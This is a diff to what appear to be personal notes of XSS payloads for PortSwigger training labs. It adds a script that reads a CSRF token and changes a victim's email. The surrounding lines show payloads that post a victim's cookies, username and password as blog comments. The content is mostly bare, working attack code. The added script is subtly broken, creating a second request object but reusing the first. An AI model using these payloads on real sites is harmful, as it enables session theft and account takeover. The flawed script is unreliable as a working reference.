@@ -249,6 +249,20 @@ body: "csrf=" + token + "&postId=10&comment=mycookie:"+ document.cookie + "&name
 <input type=password name=password onchange="var token = document.getElementsByName('csrf')[0].value;fetch('post/comment', {method: 'POST',mode: 'no-cors',headers: {'Content-Type' : 'application/x-www-form-urlencoded',},body: 'csrf=' + token + '&postId=2&comment='+ username.value + ':' + this.value + '&name=test&email=test%40test.com&website=http%3A%2F%2Ftest.com'});">
 ```
 
+## PortSwigger XSS Exploitation challenges: performing CSRF to change user email (https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET','post?postId=8',false);
+xhr.send();
+var token = xhr.responseText.match("csrf\" value=\"(.*)\"")[1];
+var xhr2 = new XMLHttpRequest();
+xhr.open('POST', 'my-account/change-email', false);
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhr.send("email=wiener2%40normal-user.net&csrf=" + token);
+</script>
+```
+
 ---
 
 checkpoint
